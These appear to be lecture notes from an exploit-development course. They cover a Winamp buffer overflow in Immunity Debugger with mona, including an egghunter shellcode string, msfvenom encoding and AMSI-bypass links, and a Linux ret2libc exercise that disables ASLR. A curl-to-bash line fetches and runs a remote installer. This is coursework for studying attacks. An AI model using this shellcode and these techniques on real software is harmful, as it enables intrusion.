# lecture 1

immunity: set options

* ignore exceptions (via: add latest) before pressing `shift-f9` to pass it
* set proper font (Consolas, regular, 14pt)

---

immunity debugger

* `alt-o` options
* `alt-c` CPU
* `alt-l` log (mona output)

---

winamp

* `alt-3` show file info (take a look at the exploit)
* `str-o` open playlist file
* `x` play

---

* `!mona config -set workingfolder Z:\WH3` (shared folder)
* run program in debugger!
* **`jmp esp`**
* `!mona jmp -n -r esp -cm safeseh=false,rebase=false,aslr=false`
  * find `jmp esp` (`-r` is target register)
  * `-n` skips addresses starting with NULL byte
  * `-cm` speficy options
  * this took very long! (much faster with `-cm`!)
* let's use `0x1a113749` gen_ff.dll
  * `break 0x1a113749`
    * immunity tends to forget breakpoints, so let's keep this
* we have space above our jmp esp
* **negative jump** up! (0xebe0) -> `jmp short -30`
  * works! but too 30 bytes are not enough space for our jmp back
  * neither are 127 bytes (max for negative jmp)
  * let's jump more!
* replace jmp esp + neg. jmp with: **sub esp, sub esp, jmp esp**

* `!mona egg -wow64 -winver10`

from egghunter.txt:

```sh
"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
"\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
"\xff\xe7"
```
convert it to bytes with python:

```python
eggh = "\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53" \
"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c" \
"\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7" \
"\xff\xe7"

print(eggh)
```
direct it into a file:

```sh
gen.py > eggh.bin
r2  eggh.bin
aaa;Vpp
```

```sh
cat eggh.bin| msfvenom -p - -a x86 --platform win
 -e x86/alpha_mixed -f perl
```

# lecture 2

* https://amsi.fail/
* https://rastating.github.io/creating-a-custom-shellcode-encoder/
* https://medium.com/manomano-tech/a-red-team-operation-leveraging-a-zero-day-vulnerability-in-zoom-80f57fb0822e
* https://www.golem.de/news/csv-import-luca-app-ermoeglichte-code-injection-bei-excel-2105-156787.html

# task 3

```sh
md5 AAAAAAAA
# MD5(AAAAAAAA)= 41153e9946e683e15a29766ae0f568f8

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

uname -a
# Linux kali 5.16.0-kali1-amd64 #1 SMP PREEMPT Debian 5.16.7-2kali1 (2022-02-10) x86_64 GNU/Linux

strings AAAAAAAA
# AAAAAAA.c
# fflush@@GLIBC_2.2.5
# __isoc99_scanf@@GLIBC_2.7

python3 -c "print('A'*1000)"|./AAAAAAAA
# sigsegv

# install ghidra
#  apt install ghidra
# install gdb gef
#  bash -c "$(curl -fsSL http://gef.blah.cat/sh)"

# radare2

cp AAAAAAAA bin
r2 -dAA bin # -d debug (run app), -AA analyze (aaaa)

# in r2:

iq # simple infos
ii # list imports
afll # verbose function list
afv # list variables in current scope

# r2 starts at 7fcd050 # `starti` in gdb
db entry0
db main # break @main
db # list breakpoints
Vpp # or V!
:dc # continue
g entry0 # goto

s main
pdf
s sym.copy
pdf

###
# https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
# stack not executable, can't run shellcode from it.
# point it to system() call in libc instead.

./expl.py # gen payload
gdb bin

# in gdb gef:
checksec # nx bit set! stack not executable.
break *main
ct # after ctrl-l
run < payload # use payload content as stdin input.
break *copy
continue
fin # if stepping into function, run until ret
bt # frame #1 is the next rip
x/8a $rsp-32 # show stack around $sp
# or sp alias
p $rbp # rbp is not the same as bp (longer)

break *copy+34 # ret
p system
p exit
search-pattern '/bin/sh'
```

# ret2libc

ROP unter Linux

* Global Offset Table (GOT)
    * global für das system (shared objects)
* Procedure Linkage Table (PLT)
    * konkrete funktionen aus (z.b.) libc reingelinked

```sh
elf-info
got
i proc m
```

wir brauchen address leak für 3b!
